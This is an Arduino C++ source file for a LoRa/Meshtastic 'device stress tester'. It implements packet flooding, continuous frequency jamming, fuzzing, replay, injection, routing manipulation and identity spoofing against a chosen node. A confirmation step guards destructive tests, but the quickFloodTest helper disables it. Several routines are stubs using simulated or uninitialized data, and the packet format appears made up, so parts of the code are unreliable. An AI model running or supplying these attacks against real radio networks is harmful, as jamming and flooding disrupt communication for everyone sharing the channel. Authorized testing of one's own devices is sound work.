/**
 * Device Stress Tester - Implementation
 * Offensive security testing for LoRa/Meshtastic devices
 */

#include "device_stress_tester.h"

DeviceStressTester::DeviceStressTester(SX1262* radioModule) {
    radio = radioModule;
    initialized = false;
    ethicalMode = true;  // Default to requiring confirmation
    
    // Clear target
    target.nodeId = 0;
    target.responding = false;
    target.packetsReceived = 0;
}

bool DeviceStressTester::initialize() {
    Serial.println("[OFFENSIVE] Initializing adversarial testing framework...");
    
    if (!radio) {
        Serial.println("❌ Radio module not available");
        return false;
    }
    
    initialized = true;
    
    Serial.println("✅ Device stress tester initialized");
    Serial.println("⚠️ ETHICAL MODE: " + String(ethicalMode ? "ENABLED" : "DISABLED"));
    Serial.println("📋 Available attack types:");
    Serial.println("   • Packet flooding (DoS)");
    Serial.println("   • Malformed packets (Fuzzing)");
    Serial.println("   • Frequency jamming");
    Serial.println("   • Timing analysis");
    Serial.println("   • Protocol violations");
    Serial.println("   • Power analysis");
    Serial.println("   • Packet replay");
    Serial.println("   • Packet injection");
    Serial.println("   • Routing manipulation");
    Serial.println("   • Identity spoofing");
    
    if (ethicalMode) {
        Serial.println("\n⚖️ ETHICAL TESTING ENABLED:");
        Serial.println("   • Destructive tests require confirmation");
        Serial.println("   • All actions logged for audit trail");
        Serial.println("   • Results exported for responsible disclosure");
    }
    
    return true;
}

void DeviceStressTester::setEthicalMode(bool enabled) {
    ethicalMode = enabled;
    Serial.printf("[OFFENSIVE] Ethical mode: %s\n", enabled ? "ENABLED" : "DISABLED");
}

bool DeviceStressTester::selectTarget(uint32_t nodeId, float frequency) {
    Serial.printf("[OFFENSIVE] Selecting target: Node 0x%08X on %.3f MHz\n", 
                  nodeId, frequency);
    
    target.nodeId = nodeId;
    target.frequency = frequency;
    target.responding = false;
    target.packetsReceived = 0;
    target.lastSeen = 0;
    
    // Configure radio to target frequency
    if (radio->setFrequency(frequency) != RADIOLIB_ERR_NONE) {
        Serial.println("❌ Failed to set target frequency");
        return false;
    }
    
    Serial.println("✅ Target selected");
    return true;
}

bool DeviceStressTester::lockOntoTarget() {
    Serial.println("[OFFENSIVE] Locking onto target...");
    
    // Listen for target packets
    unsigned long start = millis();
    bool detected = false;
    
    radio->startReceive();
    
    while (millis() - start < 10000) {  // 10 second window
        // Check if packet received (simplified - integrate with main packet handler)
        delay(100);
        
        // In real implementation, check packet buffer for target node
        // For now, simulate detection
    }
    
    if (detected) {
        Serial.println("🎯 Target lock acquired");
        target.responding = true;
        return true;
    } else {
        Serial.println("⚠️ Target not detected - may be offline or out of range");
        return false;
    }
}

bool DeviceStressTester::executeAttack(const AttackConfig& config) {
    if (!initialized) {
        Serial.println("❌ Tester not initialized");
        return false;
    }
    
    if (!validateAttackParameters(config)) {
        Serial.println("❌ Invalid attack parameters");
        return false;
    }
    
    if (ethicalMode && config.destructive) {
        if (!requestUserConfirmation(config)) {
            Serial.println("⚠️ Attack aborted by user");
            return false;
        }
    }
    
    Serial.println("\n╔════════════════════════════════════════════╗");
    Serial.printf("║  EXECUTING ATTACK: %-23s ║\n", 
                  attackTypeToString(config.type).c_str());
    Serial.println("╚════════════════════════════════════════════╝");
    Serial.printf("🎯 Target: 0x%08X\n", config.targetNodeId);
    Serial.printf("📡 Frequency: %.3f MHz\n", config.targetFrequency);
    Serial.printf("⏱️ Duration: %u ms\n", config.duration);
    Serial.printf("⚠️ Destructive: %s\n", config.destructive ? "YES" : "NO");
    
    logAttackAction("START: " + config.description);
    
    bool result = false;
    unsigned long startTime = millis();
    
    switch (config.type) {
        case ATTACK_PACKET_FLOOD:
            result = executePacketFlood(config);
            break;
            
        case ATTACK_MALFORMED_PACKETS:
            result = executeMalformedPackets(config);
            break;
            
        case ATTACK_FREQUENCY_JAMMING:
            result = executeFrequencyJamming(config);
            break;
            
        case ATTACK_TIMING_ANALYSIS:
            result = executeTimingAnalysis(config);
            break;
            
        case ATTACK_PROTOCOL_VIOLATION:
            result = executeProtocolViolation(config);
            break;
            
        case ATTACK_POWER_ANALYSIS:
            result = executePowerAnalysis(config);
            break;
            
        case ATTACK_REPLAY:
            result = executeReplayAttack(config);
            break;
            
        case ATTACK_INJECTION:
            result = executeInjectionAttack(config);
            break;
            
        case ATTACK_ROUTING_MANIPULATION:
            result = executeRoutingManipulation(config);
            break;
            
        case ATTACK_IDENTITY_SPOOFING:
            result = executeIdentitySpoofing(config);
            break;
            
        default:
            Serial.println("❌ Unknown attack type");
            return false;
    }
    
    lastResult.duration = millis() - startTime;
    
    Serial.println("\n📊 ATTACK COMPLETED");
    Serial.printf("Duration: %lu ms\n", lastResult.duration);
    Serial.printf("Success: %s\n", result ? "YES" : "NO");
    
    logAttackAction("END: " + config.description);
    
    return result;
}

bool DeviceStressTester::executePacketFlood(const AttackConfig& config) {
    Serial.println("🌊 PACKET FLOOD ATTACK");
    Serial.println("Purpose: Test target's packet handling capacity and DoS resilience");
    
    lastResult.type = ATTACK_PACKET_FLOOD;
    lastResult.packetsTransmitted = 0;
    lastResult.responsesSeen = 0;
    lastResult.targetCrashed = false;
    lastResult.targetUnresponsive = false;
    
    unsigned long startTime = millis();
    uint32_t delayBetweenPackets = 1000 / config.packetRate;  // ms
    
    while (millis() - startTime < config.duration) {
        // Build valid Meshtastic packet
        uint8_t packet[256];
        size_t length = 0;
        buildValidPacket(packet, &length, config.targetNodeId);
        
        // Transmit
        int state = radio->transmit(packet, length);
        if (state == RADIOLIB_ERR_NONE) {
            lastResult.packetsTransmitted++;
            
            if (lastResult.packetsTransmitted % 20 == 0) {
                // Check if target still responding
                bool responding = isTargetResponding();
                Serial.printf("📊 Sent: %u packets, Target: %s\n",
                             lastResult.packetsTransmitted,
                             responding ? "RESPONDING" : "NOT RESPONDING");
                
                if (!responding && target.responding) {
                    // Target was responding, now isn't
                    lastResult.targetUnresponsive = true;
                    lastResult.vulnerabilityFound = true;
                    lastResult.findings = "Target stopped responding after " + 
                                        String(lastResult.packetsTransmitted) + " packets";
                    
                    Serial.println("🚨 VULNERABILITY DETECTED: Target unresponsive!");
                    break;
                }
            }
        }
        
        delay(delayBetweenPackets);
    }
    
    lastResult.successRate = target.responding ? 1.0 : 0.0;
    
    if (lastResult.vulnerabilityFound) {
        lastResult.recommendations = "CRITICAL: Implement packet rate limiting. "
                                    "Target should reject or queue excess packets. "
                                    "Consider watchdog timer to detect flooding.";
    } else {
        lastResult.recommendations = "Target handled flood gracefully. No immediate concerns.";
    }
    
    return true;
}

bool DeviceStressTester::executeMalformedPackets(const AttackConfig& config) {
    Serial.println("🧪 MALFORMED PACKET FUZZING");
    Serial.println("Purpose: Find parser bugs and input validation issues");
    
    lastResult.type = ATTACK_MALFORMED_PACKETS;
    lastResult.packetsTransmitted = 0;
    lastResult.vulnerabilityFound = false;
    
    PacketFuzzer fuzzer(millis());
    
    // Test different malformation types
    const char* fuzzTypes[] = {
        "Invalid header",
        "Wrong magic bytes", 
        "Oversized packet",
        "Undersized packet",
        "Invalid protobuf",
        "Corrupted length field",
        "Invalid node ID",
        "Reserved bits set",
        "Out-of-range values",
        "Random garbage"
    };
    
    for (uint8_t fuzzType = 0; fuzzType < 10; fuzzType++) {
        Serial.printf("Testing: %s...\n", fuzzTypes[fuzzType]);
        
        for (int i = 0; i < 10; i++) {  // 10 variants per type
            uint8_t packet[256];
            size_t length = 0;
            
            buildMalformedPacket(packet, &length, fuzzType);
            
            // Add random mutations
            fuzzer.mutatePacket(packet, packet, length);
            
            // Transmit malformed packet
            radio->transmit(packet, length);
            lastResult.packetsTransmitted++;
            
            delay(100);
            
            // Check if target crashed
            if (!isTargetResponding()) {
                lastResult.targetCrashed = true;
                lastResult.vulnerabilityFound = true;
                lastResult.findings = "Target crashed on fuzz type: " + String(fuzzTypes[fuzzType]);
                
                Serial.println("🚨 VULNERABILITY DETECTED: Target crashed!");
                Serial.printf("Crash trigger: %s (variant %d)\n", fuzzTypes[fuzzType], i);
                
                lastResult.recommendations = "CRITICAL: Input validation failure. "
                                            "Parser must handle all malformed packets gracefully. "
                                            "Add bounds checking and error handling.";
                return true;
            }
        }
    }
    
    if (!lastResult.vulnerabilityFound) {
        lastResult.recommendations = "Target handled all malformed packets without crashing. "
                                    "Good input validation.";
    }
    
    return true;
}

bool DeviceStressTester::executeFrequencyJamming(const AttackConfig& config) {
    Serial.println("📡 FREQUENCY JAMMING");
    Serial.println("Purpose: Test interference resilience");
    Serial.println("⚠️ This is a destructive test - blocks legitimate communication");
    
    lastResult.type = ATTACK_FREQUENCY_JAMMING;
    
    // Transmit continuous carrier on target frequency
    radio->setFrequency(config.targetFrequency);
    
    Serial.println("🔥 Jamming frequency for " + String(config.duration) + " ms");
    
    // Note: RadioLib doesn't have transmitCarrier(), so use repeated preamble
    uint8_t jamSignal[32];
    memset(jamSignal, 0xAA, 32);  // Alternating pattern
    
    unsigned long startTime = millis();
    while (millis() - startTime < config.duration) {
        radio->transmit(jamSignal, 32);
        // No delay - jam continuously
    }
    
    radio->standby();
    
    Serial.println("Jamming stopped. Observing target recovery...");
    delay(5000);
    
    bool recovered = isTargetResponding();
    lastResult.targetUnresponsive = !recovered;
    lastResult.vulnerabilityFound = !recovered;
    
    if (!recovered) {
        lastResult.findings = "Target did not recover from jamming within 5 seconds";
        lastResult.recommendations = "Target should implement frequency hopping or "
                                    "channel quality assessment to avoid jammed frequencies.";
    } else {
        lastResult.recommendations = "Target recovered from jamming successfully.";
    }
    
    return true;
}

bool DeviceStressTester::executeTimingAnalysis(const AttackConfig& config) {
    Serial.println("⏱️ TIMING ANALYSIS ATTACK");
    Serial.println("Purpose: Measure response times to infer internal state");
    
    lastResult.type = ATTACK_TIMING_ANALYSIS;
    
    float responseTimes[100];
    int measurements = 0;
    
    for (int i = 0; i < 100 && measurements < 100; i++) {
        uint8_t packet[64];
        size_t length = 0;
        buildValidPacket(packet, &length, config.targetNodeId);
        
        unsigned long sendTime = micros();
        radio->transmit(packet, length);
        
        // Wait for response (simplified - needs actual response detection)
        unsigned long responseTime = measureResponseTime();
        
        if (responseTime > 0) {
            responseTimes[measurements] = responseTime / 1000.0;  // Convert to ms
            measurements++;
            Serial.printf("Response %d: %.2f ms\n", measurements, responseTimes[measurements-1]);
        }
        
        delay(100);
    }
    
    // Analyze timing patterns
    if (measurements > 10) {
        float avg = 0, min = responseTimes[0], max = responseTimes[0];
        for (int i = 0; i < measurements; i++) {
            avg += responseTimes[i];
            if (responseTimes[i] < min) min = responseTimes[i];
            if (responseTimes[i] > max) max = responseTimes[i];
        }
        avg /= measurements;
        
        Serial.printf("\n📊 TIMING ANALYSIS RESULTS:\n");
        Serial.printf("Measurements: %d\n", measurements);
        Serial.printf("Average: %.2f ms\n", avg);
        Serial.printf("Min: %.2f ms\n", min);
        Serial.printf("Max: %.2f ms\n", max);
        Serial.printf("Variance: %.2f ms\n", max - min);
        
        if ((max - min) / avg > 0.5) {  // >50% variance
            lastResult.vulnerabilityFound = true;
            lastResult.findings = "Significant timing variance detected (>50%). "
                                "May indicate encryption/decryption timing differences.";
            lastResult.recommendations = "Consider adding timing jitter to prevent "
                                        "timing-based side channel attacks.";
        }
    }
    
    return true;
}

bool DeviceStressTester::executeProtocolViolation(const AttackConfig& config) {
    Serial.println("🚫 PROTOCOL VIOLATION TEST");
    Serial.println("Purpose: Test protocol parser's edge case handling");
    
    lastResult.type = ATTACK_PROTOCOL_VIOLATION;
    lastResult.packetsTransmitted = 0;
    
    // Test various protocol violations
    struct ViolationTest {
        const char* name;
        void (*builder)(uint8_t*, size_t*);
    };
    
    Serial.println("Testing protocol violations:");
    Serial.println("  • Invalid hop count (>7)");
    Serial.println("  • Reserved flags set");
    Serial.println("  • Out-of-sequence packets");
    Serial.println("  • Invalid channel index");
    Serial.println("  • Malformed routing headers");
    
    for (int test = 0; test < 5; test++) {
        for (int i = 0; i < 10; i++) {
            uint8_t packet[256];
            size_t length = 64;
            
            // Build packet with specific violation
            buildRoutingPacket(packet, &length, test);
            
            radio->transmit(packet, length);
            lastResult.packetsTransmitted++;
            
            delay(50);
            
            if (!isTargetResponding()) {
                lastResult.targetCrashed = true;
                lastResult.vulnerabilityFound = true;
                lastResult.findings = "Target crashed on protocol violation test " + String(test);
                
                Serial.println("🚨 VULNERABILITY: Target crashed on protocol violation!");
                return true;
            }
        }
    }
    
    lastResult.recommendations = "Target handled protocol violations without crashing.";
    return true;
}

bool DeviceStressTester::executePowerAnalysis(const AttackConfig& config) {
    Serial.println("🔋 POWER ANALYSIS");
    Serial.println("Purpose: Analyze RSSI patterns for information leakage");
    
    lastResult.type = ATTACK_POWER_ANALYSIS;
    
    // Send packets at different power levels and measure responses
    int powerLevels[] = {0, 5, 10, 15, 20};
    
    for (int power : powerLevels) {
        radio->setOutputPower(power);
        
        Serial.printf("Testing at %d dBm...\n", power);
        
        for (int i = 0; i < 10; i++) {
            uint8_t packet[64];
            size_t length = 0;
            buildValidPacket(packet, &length, config.targetNodeId);
            
            radio->transmit(packet, length);
            delay(100);
            
            // In real implementation, capture and analyze RSSI of responses
        }
    }
    
    radio->setOutputPower(10);  // Reset to default
    
    lastResult.recommendations = "Manual RSSI analysis required. "
                                "Check if response patterns correlate with power levels.";
    return true;
}

bool DeviceStressTester::executeReplayAttack(const AttackConfig& config) {
    Serial.println("🔁 REPLAY ATTACK");
    Serial.println("Purpose: Test anti-replay mechanisms");
    
    lastResult.type = ATTACK_REPLAY;
    
    // Capture a valid packet (simplified - should use actual captured packet)
    uint8_t capturedPacket[256];
    size_t capturedLength = 64;
    
    Serial.println("Replaying captured packet 50 times...");
    
    for (int i = 0; i < 50; i++) {
        radio->transmit(capturedPacket, capturedLength);
        delay(100);
        
        // Check if target accepts replayed packets
        if (isTargetResponding()) {
            lastResult.responsesSeen++;
        }
    }
    
    if (lastResult.responsesSeen > 1) {
        lastResult.vulnerabilityFound = true;
        lastResult.findings = "Target accepted replayed packets. No nonce/sequence checking.";
        lastResult.recommendations = "CRITICAL: Implement packet sequence numbers or nonces "
                                    "to prevent replay attacks.";
    } else {
        lastResult.recommendations = "Target correctly rejected replayed packets.";
    }
    
    return true;
}

bool DeviceStressTester::executeInjectionAttack(const AttackConfig& config) {
    Serial.println("💉 PACKET INJECTION");
    Serial.println("Purpose: Test if crafted packets are accepted into mesh");
    
    lastResult.type = ATTACK_INJECTION;
    
    // Craft packets that appear to come from legitimate nodes
    Serial.println("Injecting crafted packets into mesh network...");
    
    for (int i = 0; i < 20; i++) {
        uint8_t packet[256];
        size_t length = 0;
        
        // Build packet claiming to be from another node
        buildSpoofedPacket(packet, &length, 0x12345678);
        
        radio->transmit(packet, length);
        lastResult.packetsTransmitted++;
        
        delay(500);
    }
    
    lastResult.recommendations = "Monitor mesh to see if injected packets were routed. "
                                "If yes, mesh lacks source authentication.";
    return true;
}

bool DeviceStressTester::executeRoutingManipulation(const AttackConfig& config) {
    Serial.println("🗺️ ROUTING MANIPULATION");
    Serial.println("Purpose: Test routing protocol security");
    
    lastResult.type = ATTACK_ROUTING_MANIPULATION;
    
    Serial.println("Attempting to manipulate routing tables...");
    
    // Send packets with manipulated routing headers
    for (int hopCount = 0; hopCount < 8; hopCount++) {
        uint8_t packet[256];
        size_t length = 0;
        
        buildRoutingPacket(packet, &length, hopCount);
        radio->transmit(packet, length);
        
        delay(200);
    }
    
    lastResult.recommendations = "Monitor network routing behavior. "
                                "Check if fake routing packets affected mesh topology.";
    return true;
}

bool DeviceStressTester::executeIdentitySpoofing(const AttackConfig& config) {
    Serial.println("🎭 IDENTITY SPOOFING");
    Serial.println("Purpose: Test node authentication");
    
    lastResult.type = ATTACK_IDENTITY_SPOOFING;
    
    // Try to impersonate legitimate nodes
    uint32_t spoofedIds[] = {0x12345678, 0xAABBCCDD, 0xFFFFFFFF};
    
    for (uint32_t spoofId : spoofedIds) {
        Serial.printf("Spoofing node 0x%08X...\n", spoofId);
        
        for (int i = 0; i < 5; i++) {
            uint8_t packet[256];
            size_t length = 0;
            
            buildSpoofedPacket(packet, &length, spoofId);
            radio->transmit(packet, length);
            
            delay(500);
        }
    }
    
    lastResult.recommendations = "Check if network accepted spoofed identities. "
                                "If yes, implement PKI or MAC authentication.";
    return true;
}

// Packet builders
void DeviceStressTester::buildValidPacket(uint8_t* buffer, size_t* length, uint32_t destNode) {
    // Build Meshtastic packet structure
    buffer[0] = 0xFF;
    buffer[1] = 0xFF;
    buffer[2] = 0xFF;
    buffer[3] = 0xFF;  // Magic header
    
    // Destination node (big-endian)
    buffer[4] = (destNode >> 24) & 0xFF;
    buffer[5] = (destNode >> 16) & 0xFF;
    buffer[6] = (destNode >> 8) & 0xFF;
    buffer[7] = destNode & 0xFF;
    
    // Source node (our node ID)
    uint32_t sourceNode = 0xDEADBEEF;  // Attacker node ID
    buffer[8] = (sourceNode >> 24) & 0xFF;
    buffer[9] = (sourceNode >> 16) & 0xFF;
    buffer[10] = (sourceNode >> 8) & 0xFF;
    buffer[11] = sourceNode & 0xFF;
    
    // Packet ID (little-endian)
    uint32_t packetId = millis();
    buffer[12] = packetId & 0xFF;
    buffer[13] = (packetId >> 8) & 0xFF;
    buffer[14] = (packetId >> 16) & 0xFF;
    buffer[15] = (packetId >> 24) & 0xFF;
    
    // Flags, channel, routing
    buffer[16] = 0x00;  // Flags
    buffer[17] = 0x00;  // Channel
    buffer[18] = 0x00;  // Next hop
    buffer[19] = 0x00;  // Relay node
    
    // Payload (simple text message)
    memset(buffer + 20, 0x41, 44);  // Fill with 'A's
    
    *length = 64;
}

void DeviceStressTester::buildMalformedPacket(uint8_t* buffer, size_t* length, uint8_t fuzzType) {
    switch (fuzzType) {
        case 0:  // Invalid header
            buffer[0] = 0x00;
            buffer[1] = 0x00;
            buffer[2] = 0x00;
            buffer[3] = 0x00;
            *length = 64;
            break;
            
        case 1:  // Wrong magic bytes
            buffer[0] = 0xDE;
            buffer[1] = 0xAD;
            buffer[2] = 0xBE;
            buffer[3] = 0xEF;
            *length = 64;
            break;
            
        case 2:  // Oversized
            memset(buffer, 0xFF, 256);
            *length = 256;
            break;
            
        case 3:  // Undersized
            buffer[0] = 0xFF;
            *length = 1;
            break;
            
        case 4:  // Invalid protobuf
            buildValidPacket(buffer, length, 0x12345678);
            // Corrupt payload
            memset(buffer + 20, 0xFF, 44);
            break;
            
        default:  // Random garbage
            for (int i = 0; i < 64; i++) {
                buffer[i] = random(256);
            }
            *length = 64;
            break;
    }
}

void DeviceStressTester::buildRoutingPacket(uint8_t* buffer, size_t* length, uint8_t hopCount) {
    buildValidPacket(buffer, length, 0x12345678);
    
    // Manipulate hop count
    buffer[16] = (buffer[16] & 0xF8) | (hopCount & 0x07);
}

void DeviceStressTester::buildSpoofedPacket(uint8_t* buffer, size_t* length, uint32_t spoofedNode) {
    buildValidPacket(buffer, length, 0xFFFFFFFF);  // Broadcast
    
    // Change source to spoofed node
    buffer[8] = (spoofedNode >> 24) & 0xFF;
    buffer[9] = (spoofedNode >> 16) & 0xFF;
    buffer[10] = (spoofedNode >> 8) & 0xFF;
    buffer[11] = spoofedNode & 0xFF;
}

// Monitoring functions
bool DeviceStressTester::isTargetResponding() {
    // Simplified - in real implementation, check packet buffer
    // for recent packets from target node
    return target.responding;
}

float DeviceStressTester::measureResponseTime() {
    // Simplified - needs actual response detection
    return random(100, 500);  // Simulated response time in ms
}

bool DeviceStressTester::requestUserConfirmation(const AttackConfig& config) {
    Serial.println("\n⚠️  DESTRUCTIVE TEST CONFIRMATION REQUIRED");
    Serial.println("═══════════════════════════════════════════");
    Serial.printf("Attack: %s\n", attackTypeToString(config.type).c_str());
    Serial.printf("Target: 0x%08X\n", config.targetNodeId);
    Serial.printf("Impact: %s\n", config.description.c_str());
    Serial.println("═══════════════════════════════════════════");
    Serial.println("This test may disrupt target device operation.");
    Serial.println("Only proceed if you own the target or have authorization.");
    Serial.println("\nType 'CONFIRM' to proceed, or anything else to abort:");
    Serial.println("(30 second timeout)");
    
    unsigned long start = millis();
    String input = "";
    
    while (millis() - start < 30000) {
        if (Serial.available()) {
            char c = Serial.read();
            if (c == '\n' || c == '\r') {
                break;
            }
            input += c;
        }
        delay(10);
    }
    
    input.trim();
    
    if (input == "CONFIRM") {
        Serial.println("✅ Confirmed. Proceeding with attack...");
        return true;
    } else {
        Serial.println("❌ Not confirmed. Attack aborted.");
        return false;
    }
}

void DeviceStressTester::logAttackAction(const String& action) {
    if (ethicalMode) {
        // Log to serial and optionally to file
        Serial.printf("[AUDIT] %lu: %s\n", millis(), action.c_str());
        
        // TODO: Log to LittleFS for persistent audit trail
    }
}

bool DeviceStressTester::validateAttackParameters(const AttackConfig& config) {
    if (config.targetNodeId == 0) {
        Serial.println("❌ Invalid target node ID");
        return false;
    }
    
    if (config.targetFrequency < 900.0 || config.targetFrequency > 930.0) {
        Serial.println("❌ Invalid frequency (must be 900-930 MHz)");
        return false;
    }
    
    if (config.duration > 300000) {  // 5 minutes max
        Serial.println("❌ Duration too long (max 5 minutes)");
        return false;
    }
    
    return true;
}

void DeviceStressTester::printAttackReport() {
    Serial.println("\n╔════════════════════════════════════════════╗");
    Serial.println("║         ATTACK RESULT REPORT               ║");
    Serial.println("╚════════════════════════════════════════════╝");
    
    Serial.printf("Attack Type: %s\n", attackTypeToString(lastResult.type).c_str());
    Serial.printf("Duration: %lu ms\n", lastResult.duration);
    Serial.printf("Packets Sent: %u\n", lastResult.packetsTransmitted);
    Serial.printf("Responses: %u\n", lastResult.responsesSeen);
    Serial.printf("Target Crashed: %s\n", lastResult.targetCrashed ? "YES" : "NO");
    Serial.printf("Target Unresponsive: %s\n", lastResult.targetUnresponsive ? "YES" : "NO");
    Serial.printf("Vulnerability Found: %s\n", lastResult.vulnerabilityFound ? "YES" : "NO");
    
    if (lastResult.findings.length() > 0) {
        Serial.println("\n🔍 FINDINGS:");
        Serial.println(lastResult.findings);
    }
    
    if (lastResult.recommendations.length() > 0) {
        Serial.println("\n💡 RECOMMENDATIONS:");
        Serial.println(lastResult.recommendations);
    }
    
    Serial.println("════════════════════════════════════════════\n");
}

AttackResult DeviceStressTester::getLastResult() {
    return lastResult;
}

// Utility functions
String attackTypeToString(AttackType type) {
    switch (type) {
        case ATTACK_PACKET_FLOOD: return "Packet Flood";
        case ATTACK_MALFORMED_PACKETS: return "Malformed Packets";
        case ATTACK_FREQUENCY_JAMMING: return "Frequency Jamming";
        case ATTACK_TIMING_ANALYSIS: return "Timing Analysis";
        case ATTACK_PROTOCOL_VIOLATION: return "Protocol Violation";
        case ATTACK_POWER_ANALYSIS: return "Power Analysis";
        case ATTACK_REPLAY: return "Replay Attack";
        case ATTACK_INJECTION: return "Packet Injection";
        case ATTACK_ROUTING_MANIPULATION: return "Routing Manipulation";
        case ATTACK_IDENTITY_SPOOFING: return "Identity Spoofing";
        default: return "Unknown";
    }
}

// PacketFuzzer implementation
PacketFuzzer::PacketFuzzer(uint32_t randomSeed) {
    seed = randomSeed;
    // Seed Arduino's random number generator
    if (seed == 0) {
        seed = millis();
    }
    srand(seed);
}

void PacketFuzzer::mutatePacket(uint8_t* original, uint8_t* mutated, size_t length) {
    memcpy(mutated, original, length);
    
    // Apply random mutations
    int mutationCount = random(1, 5);
    
    for (int i = 0; i < mutationCount; i++) {
        int pos = random(length);
        mutated[pos] = random(256);
    }
}

void PacketFuzzer::fuzzHeader(uint8_t* packet) {
    // Randomly corrupt header bytes
    for (int i = 0; i < 4; i++) {
        if (random(100) < 30) {  // 30% chance per byte
            packet[i] = random(256);
        }
    }
}

void PacketFuzzer::fuzzPayload(uint8_t* packet, size_t length) {
    // Corrupt random payload bytes
    int corruptCount = random(1, length / 4);
    
    for (int i = 0; i < corruptCount; i++) {
        int pos = random(20, length);  // After header
        packet[pos] = random(256);
    }
}

// Quick access functions
bool quickFloodTest(SX1262* radio, uint32_t targetNode, uint32_t duration) {
    DeviceStressTester tester(radio);
    tester.initialize();
    tester.setEthicalMode(false);  // Skip confirmation for quick test
    
    AttackConfig config;
    config.type = ATTACK_PACKET_FLOOD;
    config.targetNodeId = targetNode;
    config.targetFrequency = 906.875;  // Default Meshtastic
    config.duration = duration;
    config.packetRate = 20;
    config.power = 10;
    config.destructive = true;
    config.description = "Quick flood test";
    
    return tester.executeAttack(config);
}

bool quickFuzzTest(SX1262* radio, uint32_t targetNode, uint32_t packets) {
    DeviceStressTester tester(radio);
    tester.initialize();
    tester.setEthicalMode(false);
    
    AttackConfig config;
    config.type = ATTACK_MALFORMED_PACKETS;
    config.targetNodeId = targetNode;
    config.targetFrequency = 906.875;
    config.duration = packets * 100;  // 100ms per packet
    config.destructive = false;
    config.description = "Quick fuzz test";
    
    return tester.executeAttack(config);
}
